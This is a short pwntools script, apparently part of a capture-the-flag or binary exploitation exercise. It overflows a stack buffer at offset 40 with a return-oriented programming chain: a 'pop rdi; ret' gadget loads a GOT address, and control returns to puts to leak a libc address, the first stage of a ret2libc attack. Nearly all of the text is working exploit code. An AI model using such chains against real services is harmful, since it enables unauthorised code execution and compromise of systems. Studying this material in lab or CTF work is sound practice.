io = start()
io.recvuntil("Hello\n")
payload = fit({
    40: 0x0000000000400683, # 0x0000000000400683: pop rdi; ret; 
    48: 0x0000000000601018, # point RDI to GOT table to leak libc
    56: 0x00000000004005f5, # ret back to puts() / gets() overflow
    }, length=128)
io.sendline(payload)
print("libc: " + io.recvline())